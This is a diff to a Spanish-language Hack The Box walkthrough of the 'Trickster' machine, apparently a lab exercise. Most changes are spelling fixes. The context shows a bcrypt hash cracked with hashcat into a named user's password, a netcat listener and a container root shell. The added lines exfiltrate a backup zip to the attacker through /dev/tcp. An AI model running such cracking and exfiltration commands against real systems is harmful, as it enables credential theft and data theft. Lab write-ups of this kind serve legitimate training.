@@ -76,9 +76,9 @@ james@trickster.htb
 $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
 ```
 
-Para esos hashes los cuardamos en un archivo y se los pasamos ha [[HASCAT]] el cual nos dira diferentes modos que debmos de probar para decodearlo ` hashcat hashes /usr/share/wordlists/rockyou.txt -O `
+Para esos hashes los cuadramos en un archivo y se los pasamos ha [[HASCAT]] el cual nos dirá diferentes modos que debemos de probar para decodearlo ` hashcat hashes /usr/share/wordlists/rockyou.txt -O `
 
-Nos indica que son bcrypt y tendremos que usar el siguiente parametro
+Nos indica que son bcrypt y tendremos que usar el siguiente parámetro
 `hashcat hashes /usr/share/wordlists/rockyou.txt -O -m 3200`
 
 Encontramos la contraseña `alwaysandforever` para el usuario `james`
@@ -139,5 +139,10 @@ En nuestra maquina atacante nos ponemos en escucha `nc -nlvp 445` y realizamos c
 Hemos obtenido una shell como root dentro del contenedor  con IP `172.17.0.2:5000`  una vez obtenida la shell hacemos un tratamiento de esta
 
 Si navegamos por los directorios encontramos en la raíz un directorio `/datastore`
+En el directorio `Backup` encontramos un `.zip` nos lo traemos a nuestra maquina atacante de la siguiente forma:
+Maquina atacante -> `nc -nlvp 443 > archivo.zip`
+Maquina victima -> `cat < archivo.zip > /dev/tcp/>IP_Atcante>/443`
+
+Descomprimimos el archivo, y vemos que en una carpeta hay un archivo `.br`
 
 
